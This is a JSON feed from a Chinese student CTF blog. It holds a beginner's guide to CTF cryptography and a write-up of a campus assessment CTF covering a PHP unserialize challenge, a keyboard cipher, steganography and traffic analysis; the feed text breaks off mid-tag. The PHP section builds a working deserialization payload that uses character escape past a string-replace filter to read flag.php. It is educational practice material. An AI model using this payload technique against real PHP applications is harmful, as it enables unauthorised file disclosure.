{
    "version": "https://jsonfeed.org/version/1",
    "title": "FanqieのBlog",
    "description": "学习博客",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/10/23/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/",
            "url": "http://example.com/2021/10/23/CRYPTO%E2%80%94%E2%80%94%E5%AF%86%E7%A0%81%E7%9A%84%E5%8F%96%E7%BB%8F%E4%B9%8B%E8%B7%AF/",
            "title": "CRYPTO——密码的取经之路",
            "date_published": "2021-10-23T02:44:00.030Z",
            "content_html": "<p>just an introduction for 1024CTF to beginner, I'm also an amateur</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<p><em><strong>welcome to 1024CTF !</strong></em></p>\n<p>这是一篇帮助你干掉密码的攻略，仔细阅读喔～</p>\n<hr>\n<h2 id=\"为什么写这篇文章why\"><a class=\"anchor\" href=\"#为什么写这篇文章why\">#</a> 为什么写这篇文章：Why</h2>\n<p>答：因为题出的有点有点难，密码题一般解题情况不是很乐观，因为大多依靠经验和网络。</p>\n<p>所以写这篇指南做一下简单介绍，帮你们排一下雷，快速入门</p>\n<blockquote>\n<p><s>ps：如果你对密码和其他方向都感兴趣，可以像我一样主攻其他的顺便搞一搞密码和杂项</s></p>\n<p>​\t\t战队缺密码手</p>\n</blockquote>\n<hr>\n<h2 id=\"什么是密码学what\"><a class=\"anchor\" href=\"#什么是密码学what\">#</a> <strong>什么是密码学：What</strong></h2>\n<blockquote>\n<p>** 顾名思义就是研究加密的学科。** 现代密码学要求在加密算法公开的情况下，只要不知道密钥，就无法对消息进行解密。这样的话，仅需要保护一个不算长的密钥即可保护一段信息；即使密钥泄露，换个密钥就能继续用同一个加密算法加密。所以，密码学就是要寻找一个在不知道密钥情况下无法破解的算法。</p>\n</blockquote>\n<p>在 CTF 比赛中，密码学有难有易，简单题甚至不需要过脑子就可以解密出来，而往往重要比赛中，解密需要脚本的支持与配合，这就要求解题人掌握熟练地编程能力，灵活的思维和丰富的经验。相对而言密码学是一个比较容易入手的方向，只是需要时间的积淀，你也可以成为一名合格的密码手，并且逐渐享受密码学带给你的乐趣。</p>\n<hr>\n<h2 id=\"学习密码学需要什么基础basis\"><a class=\"anchor\" href=\"#学习密码学需要什么基础basis\">#</a> <strong>学习密码学需要什么基础：Basis</strong></h2>\n<blockquote>\n<p><strong>数学基础</strong>： 密码学是数学的一个应用学科，最早的公钥密码算法 RSA 就是基于数论的，因此学习密码学通常还需要从数论开始学起。其次，最早不是基于数学的块密码，在发展的过程中，也被运用数学的语言来描述，从而更能够更清晰的找到攻击方法。因此，学习密码学会涉及到大量的数学知识，欢迎对数学感兴趣（至少不讨厌）的同学来钻研学习</p>\n</blockquote>\n<blockquote>\n<p><strong>编程基础</strong>： 现代密码学比古典密码复杂许多，它的加密解密算法不是人能够口算或者笔算出来的东西，因此也需要编程。而密码学由于经常要用到特别大的数字，远超 c 和 c++ 的 long long int 的上限，因此一般使用 python 编写程序。python 是一个较接近自然语言的编程语言，因此容易上手，灵活运用搜索引擎以及网上一些教程很容易学会。</p>\n</blockquote>\n<blockquote>\n<p><strong>英语基础</strong>： 你有可能会遇到一些需要阅读纯英文文章才能解决的题目，需要有一定的耐心才能看明白。</p>\n</blockquote>\n<p>害，不要被这些条件吓走，毕竟这是<strong>大佬水准</strong>，而我只是一名 web 来兼任的密码的菜鸡，教不了你们这些...</p>\n<p>对于我们这种小白，或者是想在其他方向瓶颈时研究一下密码学，其实都不是很难，只需要从基础密码抓起，慢慢培养兴趣，逐渐就会有所收获，成为密码大佬！</p>\n<hr>\n<h2 id=\"常见密码分类classify\"><a class=\"anchor\" href=\"#常见密码分类classify\">#</a> <strong>常见密码分类：Classify</strong></h2>\n<p>由于这是一篇赛前指南，我就不在此对密码详细介绍了，只做一下<strong>基本密码的分类</strong>，详细的问题还要自己努力呀</p>\n<p>（请仔细阅读，部分题型就在这里）</p>\n<p><em><strong>新手常见密码分类：</strong></em></p>\n<ul>\n<li>\n<p>基本古典密码：栅栏密码、埃特巴什码、凯撒密码、猪圈密码、Keyboard 密码、标准银河字母密码、圣堂武士密码、维吉尼亚密码</p>\n</li>\n<li>\n<p>基本编码类密码：ASCII 编码、Base64/32/16 编码、莫尔斯电码、UUencode 编码、URL 编码、Unicode 编码、敲击码、MD5</p>\n</li>\n<li>\n<p>花里胡哨可能出现但用处不多的密码：php 混淆加密、JSfuck、aaencode、brainfuck、ook 编码、emo 密码、base 全家桶系列</p>\n</li>\n<li>\n<p>其他可能出现的简单密码：ROT 系列、佛语论禅及其变形、价值观、猪圈及其变形等等（各种奇怪的我一时也想不起来）</p>\n</li>\n<li>\n<p>简单脚本类：常见的 RSA 求解、常见的编码转换求解、自加密算法脚本求解等</p>\n<hr>\n</li>\n</ul>\n<h2 id=\"密码学工具及准备toolspre\"><a class=\"anchor\" href=\"#密码学工具及准备toolspre\">#</a> <strong>密码学工具及准备：Tools</strong>&amp;Pre</h2>\n<ul>\n<li>python 及其对应的一堆库</li>\n<li>一些自己大佬编写的密码工具</li>\n</ul>\n<p>python 请自行配置，推荐 3.7 以上版本，请确保 pip 正常使用。平时积累的脚本可以收集起来，可能会反复使用</p>\n<p>建议多刷题，在无聊的时间里，养成基本密码一眼看出的水平。</p>\n<p>了解 rsa 算法，rsa 在密码方向占了重要位置</p>\n<p>多收藏大佬的网站和帖子，多找总结帖，说不定就用上了</p>\n<hr>\n<h2 id=\"做题的基本步骤step\"><a class=\"anchor\" href=\"#做题的基本步骤step\">#</a> <strong>做题的基本步骤：Step</strong></h2>\n<ul>\n<li>不要慌，先冷静五秒</li>\n<li>看看格式有印象吗</li>\n<li>如果没有就看描述，有就去尝试</li>\n<li>如果还是不知道就用常见的试试，或者找大佬的密码总结帖，看看是否有帮助</li>\n<li>尝试到你不想做了，或者搞到 flag</li>\n<li>再不行就看 wp 写 wp 吧</li>\n</ul>\n<hr>\n<h2 id=\"写在最后last\"><a class=\"anchor\" href=\"#写在最后last\">#</a> 写在最后：Last</h2>\n<p>密码能给你在其他方向做到痛不欲生时带来一丝惊喜（上分快），通常密码和杂项配合起来有奇效（上分非常快）</p>\n<p>密码学是信安和网安的必修专业课，学会了你就领先别人一手，一举两得～</p>\n<p>但是学习 crypto 的人很少，一开始学习密码学必有许多艰难险阻...</p>\n<p>一路下来，会有不少人放弃...</p>\n<p>但是如果你带着<strong>兴趣</strong>，坚持下来，必然会有效果不错的收获！</p>\n<p>再次推一下 XJUSEC 的公众号</p>\n<p><img data-src=\"C:%5CUsers%5C%E9%AB%98%E8%90%8C%5CDesktop%5C%E4%BA%8C%E7%BB%B4%E7%A0%81.jpg\" alt=\"二维码\"></p>\n<p>在比赛的 CTFER 们，</p>\n<p>加油冲，XJUSEC 等你哟～</p>\n<blockquote>\n<p>在经历过风吹雨打之后，当第一缕的阳光投射到你疲劳憔悴的脸庞时，你会感到欣喜若狂。</p>\n</blockquote>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tWritten by 一名废物 web 选手</p>\n",
            "tags": [
                "业余爱好"
            ]
        },
        {
            "id": "http://example.com/2021/08/28/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/",
            "url": "http://example.com/2021/08/28/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/",
            "title": "xjusec考核赛解题过程",
            "date_published": "2021-08-28T10:37:25.122Z",
            "content_html": "<p>wtcl。。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<h1 id=\"web-unserialize\"><a class=\"anchor\" href=\"#web-unserialize\">#</a> web--unserialize</h1>\n<p>原码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Eileen'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Ava'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  <span class=\"token comment\">//waf 没有屏蔽重要信息，有数量变化，直接考虑字符逃逸</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 创建对象时调用</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Bella</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ico'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 销毁对象时调用</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Carol</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 打印对象时调用</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">'nice'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>本题主要考察 pop 链</p>\n<p>看到最后一行和 waf，就能发现是字符逃逸，六个变三个，每次少三个</p>\n<p>通过_toString () 方法中的 file_get_contents () 函数来读取 flag.php 的源码</p>\n<p>在 Bella 中存在字符串的拼接操作  <code>$c = 'a'.$this-&gt;b</code>  ，让此处的 $b 属性实例化为 Carol 对象即可触发__toString () 方法</p>\n<p>然后让类 Diana 的 password 属性为类 B 的实例化对象，进行序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Bella</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Carol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">-></span><span class=\"token property\">c</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>序列化后的结果</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Diana\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Bella\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Carol\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"c\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为 a 和 b 参数是可以 get 的，所以可以用 a 逃掉中间的，再构造 b：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";O:5:\"</span>Bella<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>b<span class=\"token string double-quoted-string\">\";O:5:\"</span>Carol<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:8:\"</span>flag<span class=\"token operator\">.</span>php\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>现在需要知道源代码 get a 和 b 参数后序列化是什么样子，借助本地跑一下（<em>其实直接看就能猜出来，直接输入后直接序列化类 Diana，所以只有 username 和 password 两个参数，直接参考上面的序列化的一部分就可以了</em>）：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Diana\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hah\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hah\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>再参考俩序列化的结果，找到要替换的部分</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";s:3:\"</span></pre></td></tr></table></figure><p>因为构造的 b 肯定不是个位数，而是十位数，所以上面的 3 肯定是十位数 xx</p>\n<p>总共 23 位，所以补一位 23 + 1 = 3 * 8</p>\n<p>所以 a 一共要 8 个 Eileen 替换为 Ava</p>\n<p>得到最终 payload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>a<span class=\"token operator\">=</span>EileenEileenEileenEileenEileenEileenEileenEileen<span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";O:5:\"</span>Bella<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>b<span class=\"token string double-quoted-string\">\";O:5:\"</span>Carol<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:8:\"</span>flag<span class=\"token operator\">.</span>php\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ps：试了一下有反应但没 flag，最后各种尝试修改 payload，删了一个括号看到了 flag。。（F12）</p>\n<hr>\n<h1 id=\"crypto-tik-tak\"><a class=\"anchor\" href=\"#crypto-tik-tak\">#</a> Crypto--tik-tak</h1>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvZzF3akpIWlZwN2JLRnZ4LnBuZw==\">https://i.loli.net/2021/08/26/g1wjJHZVp7bKFvx.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>进去之前看到提示，键盘，又对比了一下密码，得到如下信息：</p>\n<ul>\n<li>密码跟键盘有关</li>\n<li>数字都是重叠的</li>\n<li>每个重叠的为一组，不然不会需要 | 来分割</li>\n<li>应该为 12 个字母 3-3-2-4 ，可能为单词拼起来的 flag</li>\n</ul>\n<p>百度一下键盘密码，找到了相关的东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvQWRVbXd4VjF1UXBoSkV6LnBuZw==\">https://i.loli.net/2021/08/26/AdUmwxV1uQphJEz.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>照着百度方法试着拼了一下，啥都不是</p>\n<p>仔细研究了一下，最后发现这些字母上面的字母能拼成简单的单词，那就基本没跑了！</p>\n<p>成功得到 flag: you-are-so-good</p>\n<hr>\n<h1 id=\"misc-缩小查看更多\"><a class=\"anchor\" href=\"#misc-缩小查看更多\">#</a> MISC-- 缩小查看更多</h1>\n<p>ps：签到略了</p>\n<p>下载了是一张图片，不太会，直接百度了下，图片隐写如何查看更多信息</p>\n<p>然后了解到了 StegSolve，是比较常见的藏信息的方式，抱着试了一下的心态：</p>\n<p>看到了个好玩的</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvYUdtZ0o2T3VId2t5OEZqLnBuZw==\">https://i.loli.net/2021/08/26/aGmgJ6OuHwky8Fj.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>然后成功找 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvbUNaYVl5Z1JqS0VzVXZTLnBuZw==\">https://i.loli.net/2021/08/26/mCZaYygRjKEsUvS.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<hr>\n<h1 id=\"misc-仅仅是流量分析\"><a class=\"anchor\" href=\"#misc-仅仅是流量分析\">#</a> MISC-- 仅仅是流量分析？</h1>\n<p>这道题是真不会，于是网上搜了一下后缀，然后找到了教程。。</p>\n<p>BUUCTF-MISC-USB 差不多原题，看着做了下</p>\n<p>先是修压缩包，也没说啥软件，我就拿上次做 upload 题用的 010 editor 试了下，可以修改</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvejNObllVQmZUdWV5NTZRLnBuZw==\">https://i.loli.net/2021/08/26/z3NnYUBfTuey56Q.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>找到图片，Stegslove，找到二维码：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvaUFkTVJ2ZTZmeUxHWVpXLnBuZw==\">https://i.loli.net/2021/08/26/iAdMRve6fyLGYZW.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvdUlXbnBjOW00WkxPcllkLnBuZw==\">https://i.loli.net/2021/08/26/uIWnpc9m4ZLOrYd.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom: 25%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>扫码得到： <code>ci&#123;v3erf_0tygidv2_fc0&#125;</code></p>\n<p>用 010 打开另一个 ftm 文件，搜索关键词 key，找到了 key.pcap</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvU0t6eFJGZEFHazhIZXZyLnBuZw==\">https://i.loli.net/2021/08/26/SKzxRFdAGk8Hevr.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>然后跟着 wp 做:</p>\n<p><img data-src=\"https://i.loli.net/2021/08/26/Qo8FyOxmAHV9Ejh.png\" alt=\"9.png\">&lt;!--p9--&gt;</p>\n<p>得到内容： <code>xinan</code></p>\n<p>维吉尼亚密码在线解密：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvWGhWMXlUQldTVXA4dXF4LnBuZw==\">https://i.loli.net/2021/08/26/XhV1yTBWSUp8uqx.png</span>&quot; alt=&quot;10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<p>栅栏密码：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvN0o4UzJxM0VtZXRhNUFXLnBuZw==\">https://i.loli.net/2021/08/26/7J8S2q3Emeta5AW.png</span>&quot; alt=&quot;11.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p11--&gt;</p>\n<hr>\n<h1 id=\"misc-可爱猫猫\"><a class=\"anchor\" href=\"#misc-可爱猫猫\">#</a> MISC-- 可爱猫猫</h1>\n<p>看到两张一样图片，再一看大小 5mb，就想到双图隐写，考虑是盲水印</p>\n<p>然后用 github 上的工具 BlindWaterMark 进行盲水印图片的合成和提取</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python bwm<span class=\"token punctuation\">.</span>py decode cat1<span class=\"token punctuation\">.</span>png cat2<span class=\"token punctuation\">.</span>png cat3<span class=\"token punctuation\">.</span>png <span class=\"token operator\">-</span><span class=\"token operator\">-</span>oldseed</pre></td></tr></table></figure><p>然后得到 cat3.png，打开，模糊能看到 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" 